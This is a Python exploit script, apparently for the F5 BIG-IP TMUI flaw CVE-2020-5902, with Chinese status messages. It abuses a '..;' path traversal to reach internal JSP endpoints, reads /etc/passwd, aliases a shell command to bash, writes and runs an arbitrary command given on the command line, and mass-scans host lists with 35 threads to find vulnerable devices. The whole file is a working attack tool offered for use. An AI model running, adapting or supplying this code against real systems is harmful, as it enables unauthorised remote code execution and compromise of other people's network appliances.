import requests
from colorama import Fore
import json
import sys
import queue
import threading

requests.packages.urllib3.disable_warnings()

Queue = queue.Queue()
exec_shell_list = []


def create_env(url):
    delete_alias_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
    create_alias_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
    req1 = requests.get(delete_alias_url, verify=False, timeout=10)
    if req1.status_code == 200:
        pass
    else:
        print(Fore.LIGHTRED_EX + "[-] " + url + " 不存在远程代码执行漏洞" + Fore.RESET)
        return False

    req2 = requests.get(create_alias_url, verify=False, timeout=10)
    if req2.status_code == 200:
        print(Fore.LIGHTGREEN_EX + "[+] " + url + " 成功创建 alias list=bash" + Fore.RESET)
        return True
    else:
        print(Fore.LIGHTRED_EX + "[+] " + url + " 创建命令执行环境失败 " + Fore.RESET)
        return False



def upload_payload(base_url:str,payload:str):
    payload = payload.replace(' ','+')
    upload_url = base_url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxxx&content=' + payload
    try:
        res = requests.get(url=upload_url,timeout=10,verify=False)
    except:
        print(Fore.LIGHTRED_EX + "[-] " + base_url + " 请求超时" + Fore.RESET)
        return False
    if res.status_code == 200:
        return True
    else:
        print(Fore.RED + "[-] " + base_url + " payload 发送失败" + Fore.RESET)
        return False

def read_file(base_url):
    read_url = base_url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    try:
        res = requests.get(url=read_url,timeout=10,verify=False)
    except:
        print(Fore.LIGHTRED_EX + "[-] " + base_url +" 请求超时" + Fore.RESET)
        return False
    if 'root' in res.text:
        return True
    else:
        return False

def get_exe_result(base_url:str):
    result_url = base_url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxxx'
    try:
        res = requests.get(url=result_url,timeout=10,verify=False)
    except:
        print(Fore.LIGHTRED_EX + "[-] " + base_url + " 请求超时" + Fore.RESET)
        return False
    if res.status_code == 200:
        try:
            result = json.loads(res.text.strip())["output"]
        except:
            print(Fore.RED + "[-]" + base_url + " payload 执行出错" + Fore.RESET)
            return False
        print(Fore.LIGHTGREEN_EX + result + Fore.RESET)
        return result
    else:
        print(Fore.RED + "[-] " + base_url +" payload 执行出错" + Fore.RESET)
        return False

def thread_exec():
    global exec_shell_list
    global Queue
    while not Queue.empty():
        base_url = Queue.get()
        # if upload_payload(base_url, 'id'):
        #     if 'uid' in get_exe_result(base_url):
        #         exec_shell_list.append(base_url)
        if read_file(base_url):
            print(Fore.LIGHTGREEN_EX + "[+] " + base_url + " 存在远程代码执行漏洞")
            exec_shell_list.append(base_url)
        else:
            print(Fore.RED + "[+] " + base_url + " 不存在远程代码执行漏洞")



def scan(list_file:str):
    global Queue
    global exec_shell_list
    with open(list_file,'r') as f:
        for line in f.readlines():
            Queue.put('https://' + line.strip() + ':443')
    print(Fore.LIGHTGREEN_EX + "[+] 共 " + str(Queue.qsize()) + " 个检查对象")
    thread_list = []
    for i in range(35):
        t = threading.Thread(target=thread_exec)
        thread_list.append(t)
    for t in thread_list:
        t.start()
    for t in thread_list:
        t.join()
    print(Fore.GREEN + "[+] 扫描结束" + Fore.RESET)
    print(Fore.LIGHTGREEN_EX + "[+] 扫描完毕，以下结果存在远程代码执行:")
    for line in exec_shell_list:
        print("[+] " + line.strip())
    print(Fore.RESET)



if __name__ == '__main__':
    if len(sys.argv) == 3:
        if sys.argv[1] == "scan":
            list_file = sys.argv[2]
            scan(list_file)
        else:
            banner = '''
               ______     _______     ____   ___ ____   ___       ____  ___   ___ ____  
              / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|/ _ \ / _ \___ \ 
             | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \ (_) | | | |__) |
             | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \__, | |_| / __/ 
              \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/  /_/ \___/_____|

            By: Gr33k
            '''
            print(banner)
            base_url = sys.argv[1]
            payload = sys.argv[2]
            if not create_env(base_url):
                exit(0)
            if read_file(base_url):
                print(Fore.LIGHTGREEN_EX + "[+] " + base_url + " 存在远程代码执行漏洞 已读取到/etc/passwd" + Fore.RESET)
                if upload_payload(base_url, payload):
                    print(Fore.LIGHTGREEN_EX + "[+] payload 发送成功" + Fore.RESET)
                    if get_exe_result(base_url) != "":
                        print(Fore.GREEN + "[+] 执行完毕" + Fore.RESET)
                    else:
                        print(Fore.LIGHTRED_EX + "[+] 没有读取到返回" + Fore.RESET)
            else:
                print(Fore.LIGHTRED_EX + "[-] " + base_url + " 不存在远程代码执行漏洞" + Fore.RESET)
    else:
        print("Use : ")
        print("\tpython3 f5_rce.py https://test.cn:443 'ls'")
        print("\tpython3 f5_rce.py scan filename.txt")


